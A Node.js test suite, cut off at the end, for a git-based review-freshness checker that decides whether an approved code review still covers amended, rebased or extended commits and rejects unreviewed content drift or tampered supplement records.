"use strict";

const test = require("node:test");
const assert = require("node:assert/strict");
const crypto = require("node:crypto");
const { spawnSync } = require("node:child_process");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");

const {
  baseEquivalence,
  computeDelta,
  contentIdentity,
  evaluateReviewFreshness,
  rejectedDeltaStates,
  rejectsCommit,
  validateSupplementChain,
} = require("../scripts/lib/review-freshness");
const { GIT_ENV_KEYS_TO_CLEAR, trustedDiffArgs } = require("../scripts/lib/git-env");

function makeRepo(prefix = "pm-review-freshness-") {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  const run = (...args) => {
    const result = spawnSync("git", args, { cwd: dir, encoding: "utf8" });
    assert.equal(result.status, 0, `git ${args.join(" ")}: ${result.stderr}`);
    return result.stdout.trim();
  };
  run("init", "-q", "-b", "main");
  run("config", "user.email", "test@example.com");
  run("config", "user.name", "Test User");
  run("config", "commit.gpgsign", "false");
  return { dir, run };
}

function commitFile(repo, file, content, message) {
  const target = path.join(repo.dir, file);
  fs.mkdirSync(path.dirname(target), { recursive: true });
  fs.writeFileSync(target, content);
  repo.run("add", "-A");
  repo.run("commit", "-q", "-m", message);
  return repo.run("rev-parse", "HEAD");
}

function digest(bytes) {
  return crypto.createHash("sha256").update(bytes).digest("hex");
}

function frozenDiffBytes(repo, base, head) {
  // The same pinned invocation the production callers use, so a test repository
  // that inherits a different diff config still reproduces the hashed bytes.
  const result = spawnSync("git", trustedDiffArgs("--binary", `${base}...${head}`), {
    cwd: repo.dir,
    maxBuffer: 64 * 1024 * 1024,
  });
  assert.equal(result.status, 0);
  return result.stdout;
}

function patchId(repo, diffBytes, flag) {
  const result = spawnSync("git", ["patch-id", flag], {
    cwd: repo.dir,
    input: diffBytes,
    maxBuffer: 64 * 1024 * 1024,
  });
  assert.equal(result.status, 0);
  return result.stdout.toString("utf8").split(" ")[0];
}

test("baseEquivalence accepts an unrelated advance of the authoritative base", () => {
  const repo = makeRepo();
  try {
    const baseA = commitFile(repo, "base.txt", "base\n", "base");
    repo.run("switch", "-q", "-c", "feature");
    const feature = commitFile(repo, "src/app.js", "feature\n", "feature");
    repo.run("switch", "-q", "main");
    const baseB = commitFile(repo, "unrelated.txt", "unrelated\n", "unrelated main work");
    repo.run("switch", "-q", "feature");

    const verdict = baseEquivalence({
      root: repo.dir,
      commit: feature,
      frozenBaseCommit: baseA,
      liveBaseCommit: baseB,
    });
    assert.equal(verdict.ok, true, verdict.reason);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("baseEquivalence rejects a branch that merged the moved base", () => {
  const repo = makeRepo();
  try {
    const baseA = commitFile(repo, "base.txt", "base\n", "base");
    repo.run("switch", "-q", "-c", "feature");
    commitFile(repo, "src/app.js", "feature\n", "feature");
    repo.run("switch", "-q", "main");
    const baseB = commitFile(repo, "unrelated.txt", "unrelated\n", "main work");
    repo.run("switch", "-q", "feature");
    repo.run("merge", "-q", "--no-edit", "main");
    const merged = repo.run("rev-parse", "HEAD");

    const verdict = baseEquivalence({
      root: repo.dir,
      commit: merged,
      frozenBaseCommit: baseA,
      liveBaseCommit: baseB,
    });
    assert.equal(verdict.ok, false);
    assert.match(verdict.reason, /merge base with the live base differs/);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("baseEquivalence rejects a rewritten authoritative base", () => {
  const repo = makeRepo();
  try {
    commitFile(repo, "base.txt", "base\n", "base");
    repo.run("switch", "-q", "-c", "feature");
    const feature = commitFile(repo, "src/app.js", "feature\n", "feature");
    repo.run("switch", "-q", "main");
    const frozenTip = commitFile(repo, "unrelated.txt", "unrelated\n", "main work");
    repo.run("commit", "-q", "--amend", "-m", "rewritten main work");
    const rewrittenTip = repo.run("rev-parse", "HEAD");
    repo.run("switch", "-q", "feature");

    const verdict = baseEquivalence({
      root: repo.dir,
      commit: feature,
      frozenBaseCommit: frozenTip,
      liveBaseCommit: rewrittenTip,
    });
    assert.equal(verdict.ok, false);
    assert.match(verdict.reason, /not an ancestor of the live authoritative base/);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("baseEquivalence fails closed outside a usable repository", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "pm-not-a-repo-"));
  try {
    const verdict = baseEquivalence({
      root: dir,
      commit: "a".repeat(40),
      frozenBaseCommit: "b".repeat(40),
      liveBaseCommit: "c".repeat(40),
    });
    assert.equal(verdict.ok, false);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("contentIdentity accepts an amended commit carrying identical objects", () => {
  const repo = makeRepo();
  try {
    const base = commitFile(repo, "base.txt", "base\n", "base");
    repo.run("switch", "-q", "-c", "feature");
    const reviewed = commitFile(repo, "src/app.js", "feature\n", "feature");
    const source = { commit: reviewed, base_commit: base };
    repo.run("commit", "-q", "--amend", "-m", "feature with a better message");
    const amended = repo.run("rev-parse", "HEAD");
    assert.notEqual(amended, reviewed);

    const verdict = contentIdentity({ root: repo.dir, source, currentCommit: amended });
    assert.equal(verdict.ok, true, verdict.reason);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("contentIdentity accepts a rebase when compared against the live base", () => {
  const repo = makeRepo();
  try {
    const base = commitFile(repo, "base.txt", "base\n", "base");
    repo.run("switch", "-q", "-c", "feature");
    const reviewed = commitFile(repo, "src/app.js", "feature\n", "feature");
    const source = { commit: reviewed, base_commit: base };
    repo.run("switch", "-q", "main");
    const movedBase = commitFile(repo, "unrelated.txt", "unrelated\n", "main work");
    repo.run("switch", "-q", "feature");
    repo.run("rebase", "-q", "main");
    const rebased = repo.run("rev-parse", "HEAD");

    const withLiveBase = contentIdentity({
      root: repo.dir,
      source,
      currentCommit: rebased,
      currentBaseCommit: movedBase,
    });
    assert.equal(withLiveBase.ok, true, withLiveBase.reason);

    // Against the frozen base the rebased branch also carries the upstream
    // file, which is outside anything the reviewers were shown.
    const withFrozenBase = contentIdentity({ root: repo.dir, source, currentCommit: rebased });
    assert.equal(withFrozenBase.ok, false);
    assert.match(withFrozenBase.reason, /outside the reviewed change set/);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("contentIdentity rejects a whitespace-only amend against the same base", () => {
  const repo = makeRepo();
  try {
    const base = commitFile(repo, "base.txt", "base\n", "base");
    repo.run("switch", "-q", "-c", "feature");
    const reviewed = commitFile(repo, "src/lib.py", "def f():\n    return 1\n", "feature");
    const source = { commit: reviewed, base_commit: base };
    fs.writeFileSync(path.join(repo.dir, "src/lib.py"), "def f():\nreturn 1\n");
    repo.run("add", "-A");
    repo.run("commit", "-q", "--amend", "-m", "feature dedented");
    const amended = repo.run("rev-parse", "HEAD");
    assert.notEqual(amended, reviewed);

    // Premise: patch-id --stable strips the intra-line whitespace, so a
    // patch-id acceptance would have certified this semantics-changing amend.
    // Blob identity never sees a normalized form at all.
    assert.equal(
      patchId(repo, frozenDiffBytes(repo, base, reviewed), "--stable"),
      patchId(repo, frozenDiffBytes(repo, base, amended), "--stable")
    );

    const verdict = contentIdentity({ root: repo.dir, source, currentCommit: amended });
    assert.equal(verdict.ok, false);
    assert.match(verdict.reason, /reviewed content differs at src\/lib\.py/);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("contentIdentity rejects a whitespace-only variant across a moved base", () => {
  const repo = makeRepo();
  try {
    const base = commitFile(repo, "base.txt", "base\n", "base");
    repo.run("switch", "-q", "-c", "feature");
    const reviewed = commitFile(repo, "src/lib.py", "def f():\n    return 1\n", "feature");
    const source = { commit: reviewed, base_commit: base };
    repo.run("switch", "-q", "main");
    const movedBase = commitFile(repo, "unrelated.txt", "unrelated\n", "main work");
    repo.run("switch", "-q", "-c", "feature-2");
    const dedented = commitFile(repo, "src/lib.py", "def f():\nreturn 1\n", "dedented variant");

    // Premise: --stable collides across the moved base too.
    assert.equal(
      patchId(repo, frozenDiffBytes(repo, base, reviewed), "--stable"),
      patchId(repo, frozenDiffBytes(repo, movedBase, dedented), "--stable")
    );

    const verdict = contentIdentity({
      root: repo.dir,
      source,
      currentCommit: dedented,
      currentBaseCommit: movedBase,
    });
    assert.equal(verdict.ok, false);
    assert.match(verdict.reason, /reviewed content differs at src\/lib\.py/);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("contentIdentity rejects post-review content drift", () => {
  const repo = makeRepo();
  try {
    const base = commitFile(repo, "base.txt", "base\n", "base");
    repo.run("switch", "-q", "-c", "feature");
    const reviewed = commitFile(repo, "src/app.js", "feature\n", "feature");
    const source = { commit: reviewed, base_commit: base };
    const changed = commitFile(repo, "src/app.js", "feature\nextra\n", "post-review fix");

    const drifted = contentIdentity({ root: repo.dir, source, currentCommit: changed });
    assert.equal(drifted.ok, false);
    assert.match(drifted.reason, /reviewed content differs at src\/app\.js/);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("contentIdentity refuses a certified inventory that omits a changed path", () => {
  // The reviewed commit changes two paths; the frozen inventory lists one.
  // Whatever produced the omission -- a suppressed diff row, a hand-edited
  // target -- the missing path is content nobody was asked to read, so the
  // pass cannot carry forward.
  const repo = makeRepo();
  try {
    const base = commitFile(repo, "base.txt", "base\n", "base");
    repo.run("switch", "-q", "-c", "feature");
    fs.mkdirSync(path.join(repo.dir, "src"), { recursive: true });
    fs.writeFileSync(path.join(repo.dir, "src/app.js"), "feature\n");
    fs.writeFileSync(path.join(repo.dir, "src/quiet.js"), "unlisted\n");
    repo.run("add", "-A");
    repo.run("commit", "-q", "-m", "feature");
    const reviewed = repo.run("rev-parse", "HEAD");
    repo.run("commit", "-q", "--amend", "-m", "feature, reworded");
    const amended = repo.run("rev-parse", "HEAD");

    const source = { commit: reviewed, base_commit: base };
    const complete = contentIdentity({
      root: repo.dir,
      target: { source, changed_files: [{ path: "src/app.js" }, { path: "src/quiet.js" }] },
      source,
      currentCommit: amended,
    });
    assert.equal(complete.ok, true, complete.reason);

    const partial = contentIdentity({
      root: repo.dir,
      target: { source, changed_files: [{ path: "src/app.js" }] },
      source,
      currentCommit: amended,
    });
    assert.equal(partial.ok, false);
    assert.match(partial.reason, /certified inventory does not list/);
    assert.match(partial.reason, /src\/quiet\.js/);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("computeDelta budgets code lines and exempts tests and docs", () => {
  const repo = makeRepo();
  try {
    const prior = commitFile(repo, "src/app.js", "one\ntwo\n", "base");
    commitFile(repo, "src/app.js", "one\ntwo\nthree\n", "code line");
    commitFile(repo, "tests/app.test.js", "test line\n".repeat(80), "test churn");
    const head = commitFile(repo, "docs/notes.md", "notes\n".repeat(40), "doc churn");

    const delta = computeDelta(repo.dir, prior, head);
    assert.equal(delta.code_lines, 1);
    assert.equal(delta.ineligible, null);
    assert.deepEqual(delta.files.map((row) => row.path).sort(), [
      "docs/notes.md",
      "src/app.js",
      "tests/app.test.js",
    ]);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("computeDelta budgets runtime Markdown and exempts only docs Markdown", () => {
  const repo = makeRepo();
  try {
    const prior = commitFile(repo, "src/app.js", "one\n", "base");
    commitFile(repo, "skills/dev/SKILL.md", "runtime line\n".repeat(5), "runtime markdown");
    commitFile(repo, "skills/dev/docs/steps.md", "nested docs line\n".repeat(7), "nested docs");
    const head = commitFile(repo, "docs/notes.md", "notes\n".repeat(40), "docs churn");

    const delta = computeDelta(repo.dir, prior, head);
    assert.equal(delta.code_lines, 12);
    assert.equal(delta.ineligible, null);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("computeDelta rejects a rename that crosses the exempt boundary", () => {
  const repo = makeRepo();
  try {
    const lines = `${Array.from({ length: 20 }, (_, index) => `line ${index + 1}`).join("\n")}\n`;
    const prior = commitFile(repo, "src/app.js", lines, "base");
    fs.mkdirSync(path.join(repo.dir, "tests"), { recursive: true });
    fs.renameSync(path.join(repo.dir, "src/app.js"), path.join(repo.dir, "tests/app.test.js"));
    repo.run("add", "-A");
    repo.run("commit", "-q", "-m", "relocate source into tests");
    const head = repo.run("rev-parse", "HEAD");

    const delta = computeDelta(repo.dir, prior, head);
    assert.match(delta.ineligible, /rename between exempt and non-exempt paths/);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("evaluateReviewFreshness reports every rejected path when nothing matches", () => {
  const repo = makeRepo();
  try {
    const base = commitFile(repo, "base.txt", "base\n", "base");
    repo.run("switch", "-q", "-c", "feature");
    const reviewed = commitFile(repo, "src/app.js", "feature\n", "feature");
    const head = commitFile(repo, "src/app.js", "feature\nextra\n", "unreviewed fix");
    const reviewDir = path.join(repo.dir, ".pm/dev-sessions/example/review");
    fs.mkdirSync(reviewDir, { recursive: true });
    fs.writeFileSync(path.join(reviewDir, "report.json"), "{}\n");

    const verdict = evaluateReviewFreshness({
      root: repo.dir,
      reviewDir,
      report: { outcome: "passed", source: { commit: reviewed } },
      target: {
        source: {
          commit: reviewed,
          base_commit: base,
          diff_sha256: digest(frozenDiffBytes(repo, base, reviewed)),
        },
        changed_files: [{ path: "src/app.js" }],
      },
      currentCommit: head,
    });
    assert.equal(verdict.ok, false);
    assert.match(verdict.reason, /content identity: reviewed content differs at src\/app\.js/);
    assert.match(verdict.reason, /delta chain: no delta supplements recorded/);

    const notPassed = evaluateReviewFreshness({
      root: repo.dir,
      reviewDir,
      report: { outcome: "failed", source: { commit: reviewed } },
      target: { source: { commit: reviewed } },
      currentCommit: reviewed,
    });
    assert.equal(notPassed.ok, false);
    assert.match(notPassed.reason, /outcome is not passed/);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("validateSupplementChain rejects tampered supplement bindings", () => {
  const repo = makeRepo();
  try {
    const base = commitFile(repo, "base.txt", "base\n", "base");
    repo.run("switch", "-q", "-c", "feature");
    const reviewed = commitFile(repo, "src/app.js", "feature\n", "feature");
    const fix = commitFile(repo, "src/app.js", "feature\nfixed\n", "fix");
    const reviewDir = path.join(repo.dir, ".pm/dev-sessions/example/review");
    const supplementsDir = path.join(reviewDir, "supplements");
    fs.mkdirSync(supplementsDir, { recursive: true });
    fs.writeFileSync(path.join(reviewDir, "report.json"), "{}\n");
    const report = { outcome: "passed", source: { commit: reviewed } };
    const target = {
      source: { commit: reviewed, base_commit: base },
      changed_files: [{ path: "src/app.js" }],
    };
    const supplement = {
      schema_version: 1,
      kind: "review-delta-v1",
      canonical_report: {
        sha256: digest(fs.readFileSync(path.join(reviewDir, "report.json"))),
        commit: reviewed,
      },
      prior_commit: reviewed,
      source: {
        commit: fix,
        delta_diff_sha256: digest(frozenDiffBytes(repo, reviewed, fix)),
      },
      result: { outcome: "passed" },
    };
    fs.writeFileSync(path.join(supplementsDir, "supplement-1.json"), JSON.stringify(supplement));

    const valid = validateSupplementChain({
      root: repo.dir,
      reviewDir,
      report,
      target,
      currentCommit: fix,
    });
    assert.equal(valid.ok, true, valid.reason);

    const wrongHead = validateSupplementChain({
      root: repo.dir,
      reviewDir,
      report,
      target,
      currentCommit: reviewed,
    });
    assert.equal(wrongHead.ok, false);
    assert.match(wrongHead.reason, /does not descend|ends at|is invalid/);

    fs.writeFileSync(
      path.join(supplementsDir, "supplement-1.json"),
      JSON.stringify({
        ...supplement,
        source: { ...supplement.source, delta_diff_sha256: "0".repeat(64) },
      })
    );
    const tampered = validateSupplementChain({
      root: repo.dir,
      reviewDir,
      report,
      target,
      currentCommit: fix,
    });
    assert.equal(tampered.ok, false);
    assert.match(tampered.reason, /drifted from the reviewed delta/);

    fs.writeFileSync(
      path.join(supplementsDir, "supplement-1.json"),
      JSON.stringify({ ...supplement, result: { outcome: "failed" } })
    );
    const failedOutcome = validateSupplementChain({
      root: repo.dir,
      reviewDir,
      report,
      target,
      currentCommit: fix,
    });
    assert.equal(failedOutcome.ok, false);
    assert.match(failedOutcome.reason, /outcome is not passed/);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("computeDelta prices the code-line budget exactly at its boundary", () => {
  const repo = makeRepo();
  try {
    const prior = commitFile(repo, "src/app.js", "base\n", "base");
    const atBudget = commitFile(
      repo,
      "src/exactly-fifty.js",
      `${Array.from({ length: 50 }, (_, index) => `line ${index + 1}`).join("\n")}\n`,
      "fifty added lines"
    );
    assert.equal(computeDelta(repo.dir, prior, atBudget).code_lines, 50);

    const overBudget = commitFile(repo, "src/one-more.js", "line 51\n", "one line over");
    assert.equal(computeDelta(repo.dir, prior, overBudget).code_lines, 51);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("computeDelta refuses a binary change outside the exempt paths", () => {
  const repo = makeRepo();
  try {
    const prior = commitFile(repo, "src/app.js", "base\n", "base");
    const binary = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x00, 0x01, 0x02, 0x00, 0xff]);

    const exemptBinary = commitFile(repo, "tests/fixture.png", binary, "exempt binary");
    const exemptDelta = computeDelta(repo.dir, prior, exemptBinary);
    assert.equal(exemptDelta.ineligible, null);
    assert.equal(exemptDelta.code_lines, 0);

    const sourceBinary = commitFile(repo, "src/logo.png", binary, "source binary");
    const sourceDelta = computeDelta(repo.dir, prior, sourceBinary);
    assert.match(sourceDelta.ineligible, /binary change to non-exempt path src\/logo\.png/);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("delta exemption covers nested test directories but only JS and TS test suffixes", () => {
  const repo = makeRepo();
  try {
    const prior = commitFile(repo, "src/app.js", "base\n", "base");
    // Directory rule is not root-anchored and accepts the singular form.
    commitFile(repo, "src/test/helper.js", "helper line\n".repeat(30), "nested singular test dir");
    commitFile(repo, "skills/dev/tests/case.js", "case line\n".repeat(30), "nested tests dir");
    commitFile(repo, "__tests__/case.js", "case line\n".repeat(30), "underscore tests dir");
    const exempt = commitFile(repo, "docs/notes.md", "notes\n".repeat(30), "root docs markdown");
    assert.equal(computeDelta(repo.dir, prior, exempt).code_lines, 0);

    // The suffix rule is limited to JavaScript and TypeScript extensions.
    const suffix = commitFile(repo, "api.test.py", "assert True\n".repeat(4), "python test suffix");
    assert.equal(computeDelta(repo.dir, exempt, suffix).code_lines, 4);

    const jsSuffix = commitFile(repo, "api.test.ts", "expect(1);\n".repeat(4), "ts test suffix");
    assert.equal(computeDelta(repo.dir, suffix, jsSuffix).code_lines, 0);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("validateSupplementChain rejects a chain that does not start at supplement-1", () => {
  const repo = makeRepo();
  try {
    const base = commitFile(repo, "base.txt", "base\n", "base");
    repo.run("switch", "-q", "-c", "feature");
    const reviewed = commitFile(repo, "src/app.js", "feature\n", "feature");
    const fix = commitFile(repo, "src/app.js", "feature\nfixed\n", "fix");
    const reviewDir = path.join(repo.dir, ".pm/dev-sessions/example/review");
    const supplementsDir = path.join(reviewDir, "supplements");
    fs.mkdirSync(supplementsDir, { recursive: true });
    fs.writeFileSync(path.join(reviewDir, "report.json"), "{}\n");
    const report = { outcome: "passed", source: { commit: reviewed } };
    const target = {
      source: { commit: reviewed, base_commit: base },
      changed_files: [{ path: "src/app.js" }],
    };
    fs.writeFileSync(
      path.join(supplementsDir, "supplement-2.json"),
      JSON.stringify({
        schema_version: 1,
        kind: "review-delta-v1",
        canonical_report: {
          sha256: digest(fs.readFileSync(path.join(reviewDir, "report.json"))),
          commit: reviewed,
        },
        prior_commit: reviewed,
        source: { commit: fix, delta_diff_sha256: digest(frozenDiffBytes(repo, reviewed, fix)) },
        result: { outcome: "passed" },
      })
    );

    const verdict = validateSupplementChain({
      root: repo.dir,
      reviewDir,
      report,
      target,
      currentCommit: fix,
    });
    assert.equal(verdict.ok, false);
    assert.match(verdict.reason, /not contiguous at supplement-2\.json/);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("validateSupplementChain reports the supplement cap instead of ignoring an extra slot", () => {
  const repo = makeRepo();
  try {
    const base = commitFile(repo, "base.txt", "base\n", "base");
    repo.run("switch", "-q", "-c", "feature");
    const reviewed = commitFile(repo, "src/app.js", "feature\n", "feature");
    // Commit the fix series first so the review directory stays untracked and
    // never becomes part of the deltas its supplements describe.
    const commits = [1, 2, 3].map((index) =>
      commitFile(repo, "src/app.js", `feature\nfix ${index}\n`, `fix ${index}`)
    );
    const reviewDir = path.join(repo.dir, ".pm/dev-sessions/example/review");
    const supplementsDir = path.join(reviewDir, "supplements");
    fs.mkdirSync(supplementsDir, { recursive: true });
    fs.writeFileSync(path.join(reviewDir, "report.json"), "{}\n");
    const report = { outcome: "passed", source: { commit: reviewed } };
    const target = {
      source: { commit: reviewed, base_commit: base },
      changed_files: [{ path: "src/app.js" }],
    };
    const reportSha = digest(fs.readFileSync(path.join(reviewDir, "report.json")));
    let prior = reviewed;
    for (const [position, commit] of commits.entries()) {
      fs.writeFileSync(
        path.join(supplementsDir, `supplement-${position + 1}.json`),
        JSON.stringify({
          schema_version: 1,
          kind: "review-delta-v1",
          canonical_report: { sha256: reportSha, commit: reviewed },
          prior_commit: prior,
          source: { commit, delta_diff_sha256: digest(frozenDiffBytes(repo, prior, commit)) },
          result: { outcome: "passed" },
        })
      );
      prior = commit;
    }

    // A third recorded supplement must surface the cap, not be silently
    // dropped by the filename filter and then misreported as a chain that
    // ends short of the current commit.
    const verdict = validateSupplementChain({
      root: repo.dir,
      reviewDir,
      report,
      target,
      currentCommit: prior,
    });
    assert.equal(verdict.ok, false);
    assert.match(verdict.reason, /exceeds the 2-supplement cap/);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("contentIdentity rejects a relocated edit that patch-id alone accepts", () => {
  // patch-id hashes hunk content with line offsets stripped. In a file of
  // repeated identical blocks, the same inserted line in a different block
  // produces the same patch-id against a different tree, so patch-id equality
  // cannot be the whole moved-base proof.
  const repo = makeRepo();
  try {
    const block = ["function guard(req) {", "  const ok = check(req);", "  return ok;", "}", ""];
    const original = Array.from({ length: 6 }, () => block.join("\n")).join("\n");
    const base = commitFile(repo, "a.js", original, "base");

    repo.run("switch", "-q", "-c", "feature");
    const insertAt = (lineIndex) => {
      const lines = original.split("\n");
      lines.splice(lineIndex, 0, "  if (isAdmin) return grantAll();");
      return lines.join("\n");
    };
    const reviewed = commitFile(repo, "a.js", insertAt(6), "reviewed: guard in block 2");

    repo.run("switch", "-q", "main");
    const movedBase = commitFile(repo, "other.js", "// upstream\n", "unrelated upstream work");
    repo.run("switch", "-q", "-c", "relocated", base);
    const relocated = commitFile(repo, "a.js", insertAt(26), "same line, block 6");
    repo.run("rebase", "-q", movedBase);
    const relocatedOnMovedBase = repo.run("rev-parse", "HEAD");

    const reviewedDiff = frozenDiffBytes(repo, base, reviewed);
    const currentDiff = frozenDiffBytes(repo, movedBase, relocatedOnMovedBase);
    assert.equal(
      patchId(repo, reviewedDiff, "--verbatim"),
      patchId(repo, currentDiff, "--verbatim"),
      "fixture must actually collide under patch-id, or it proves nothing"
    );
    assert.notEqual(
      repo.run("rev-parse", `${reviewed}:a.js`),
      repo.run("rev-parse", `${relocatedOnMovedBase}:a.js`),
      "fixture must carry genuinely different content"
    );

    const verdict = contentIdentity({
      root: repo.dir,
      source: { commit: reviewed, base_commit: base },
      currentCommit: relocatedOnMovedBase,
      currentBaseCommit: movedBase,
    });
    assert.equal(verdict.ok, false);
    assert.match(verdict.reason, /reviewed content differs at a\.js/);
    void relocated;
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("contentIdentity still accepts a clean rebase that only absorbed upstream files", () => {
  const repo = makeRepo();
  try {
    const base = commitFile(repo, "a.js", "one\ntwo\n", "base");
    repo.run("switch", "-q", "-c", "feature");
    const reviewed = commitFile(repo, "a.js", "one\ntwo\nthree\n", "reviewed");

    repo.run("switch", "-q", "main");
    const movedBase = commitFile(repo, "upstream.js", "// upstream\n", "unrelated upstream work");
    repo.run("switch", "-q", "feature");
    repo.run("rebase", "-q", movedBase);
    const rebased = repo.run("rev-parse", "HEAD");
    assert.notEqual(rebased, reviewed, "rebase must produce a new commit");

    const verdict = contentIdentity({
      root: repo.dir,
      source: { commit: reviewed, base_commit: base },
      currentCommit: rebased,
      currentBaseCommit: movedBase,
    });
    assert.equal(verdict.ok, true, verdict.reason);
    assert.match(
      verdict.reason,
      /identical objects across the reviewed change set on the moved base/
    );
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("contentIdentity rejects a rebase that added an unreviewed file", () => {
  const repo = makeRepo();
  try {
    const base = commitFile(repo, "a.js", "one\n", "base");
    repo.run("switch", "-q", "-c", "feature");
    const reviewed = commitFile(repo, "a.js", "one\ntwo\n", "reviewed");
    const smuggled = commitFile(repo, "extra.js", "// never reviewed\n", "extra");

    const verdict = contentIdentity({
      root: repo.dir,
      source: { commit: reviewed, base_commit: base },
      currentCommit: smuggled,
      currentBaseCommit: base,
    });
    assert.equal(verdict.ok, false);
    assert.match(verdict.reason, /extra\.js outside the reviewed change set/);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("computeDelta detects a boundary-crossing rename even with diff.renames disabled", () => {
  const repo = makeRepo();
  try {
    const body = `${Array.from({ length: 20 }, (_, index) => `const line${index} = ${index};`).join("\n")}\n`;
    const prior = commitFile(repo, "src/app.js", body, "base");
    fs.mkdirSync(path.join(repo.dir, "tests"), { recursive: true });
    repo.run("mv", "src/app.js", "tests/app.test.js");
    repo.run("commit", "-q", "-m", "relocate source into tests");
    const relocated = repo.run("rev-parse", "HEAD");

    const underDefault = computeDelta(repo.dir, prior, relocated);
    assert.match(underDefault.ineligible, /rename between exempt and non-exempt paths/);

    // Ambient config must not be able to disarm the guard by splitting the
    // rename into a free exempt addition plus a priced deletion.
    repo.run("config", "diff.renames", "false");
    const underDisabledRenames = computeDelta(repo.dir, prior, relocated);
    assert.match(underDisabledRenames.ineligible, /rename between exempt and non-exempt paths/);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("a corrupt supplement does not block an object-identical amend from content identity", () => {
  const repo = makeRepo();
  try {
    const base = commitFile(repo, "base.txt", "base\n", "base");
    repo.run("switch", "-q", "-c", "feature");
    const reviewed = commitFile(repo, "src/app.js", "feature\n", "feature");
    repo.run("commit", "-q", "--amend", "-m", "feature, reworded");
    const amended = repo.run("rev-parse", "HEAD");
    assert.notEqual(amended, reviewed);

    const reviewDir = path.join(repo.dir, ".pm/dev-sessions/example/review");
    fs.mkdirSync(path.join(reviewDir, "supplements"), { recursive: true });
    fs.writeFileSync(path.join(reviewDir, "supplements", "supplement-1.json"), "{ not json");

    const verdict = evaluateReviewFreshness({
      root: repo.dir,
      reviewDir,
      report: { outcome: "passed", source: { commit: reviewed } },
      target: {
        source: { commit: reviewed, base_commit: base },
        changed_files: [{ path: "src/app.js" }],
      },
      currentCommit: amended,
    });
    assert.equal(verdict.ok, true, verdict.reason);
    assert.equal(verdict.method, "content-identity");
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("validateSupplementChain enforces the code-line budget at exactly 51 lines", () => {
  // The boundary must be pinned through the enforcing path, not only through
  // the counter: computeDelta returning 51 proves nothing if nothing rejects it.
  const repo = makeRepo();
  try {
    const base = commitFile(repo, "base.txt", "base\n", "base");
    repo.run("switch", "-q", "-c", "feature");
    const reviewed = commitFile(repo, "src/app.js", "feature\n", "feature");
    const overBudget = commitFile(
      repo,
      "src/app.js",
      `feature\n${Array.from({ length: 51 }, (_, index) => `line ${index}`).join("\n")}\n`,
      "51 added lines"
    );
    assert.equal(computeDelta(repo.dir, reviewed, overBudget).code_lines, 51);

    const reviewDir = path.join(repo.dir, ".pm/dev-sessions/example/review");
    const supplementsDir = path.join(reviewDir, "supplements");
    fs.mkdirSync(supplementsDir, { recursive: true });
    fs.writeFileSync(path.join(reviewDir, "report.json"), "{}\n");
    fs.writeFileSync(
      path.join(supplementsDir, "supplement-1.json"),
      JSON.stringify({
        schema_version: 1,
        kind: "review-delta-v1",
        canonical_report: {
          sha256: digest(fs.readFileSync(path.join(reviewDir, "report.json"))),
          commit: reviewed,
        },
        prior_commit: reviewed,
        source: {
          commit: overBudget,
          delta_diff_sha256: digest(frozenDiffBytes(repo, reviewed, overBudget)),
        },
        result: { outcome: "passed" },
      })
    );

    const verdict = validateSupplementChain({
      root: repo.dir,
      reviewDir,
      report: { outcome: "passed", source: { commit: reviewed } },
      target: {
        source: { commit: reviewed, base_commit: base },
        changed_files: [{ path: "src/app.js" }],
      },
      currentCommit: overBudget,
    });
    assert.equal(verdict.ok, false);
    assert.match(verdict.reason, /51/);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("validateSupplementChain accepts the code-line budget at exactly 50 lines", () => {
  // The reject side was already pinned at 51. Without this, flipping the
  // comparison to `>=` -- which would reject every delta that exactly fills
  // the documented budget -- passes the whole suite.
  const repo = makeRepo();
  try {
    const base = commitFile(repo, "base.txt", "base\n", "base");
    repo.run("switch", "-q", "-c", "feature");
    const reviewed = commitFile(repo, "src/app.js", "feature\n", "feature");
    const atBudget = commitFile(
      repo,
      "src/app.js",
      `feature\n${Array.from({ length: 50 }, (_, index) => `line ${index}`).join("\n")}\n`,
      "50 added lines"
    );
    assert.equal(computeDelta(repo.dir, reviewed, atBudget).code_lines, 50);

    const reviewDir = path.join(repo.dir, ".pm/dev-sessions/example/review");
    const supplementsDir = path.join(reviewDir, "supplements");
    fs.mkdirSync(supplementsDir, { recursive: true });
    fs.writeFileSync(path.join(reviewDir, "report.json"), "{}\n");
    fs.writeFileSync(
      path.join(supplementsDir, "supplement-1.json"),
      JSON.stringify({
        schema_version: 1,
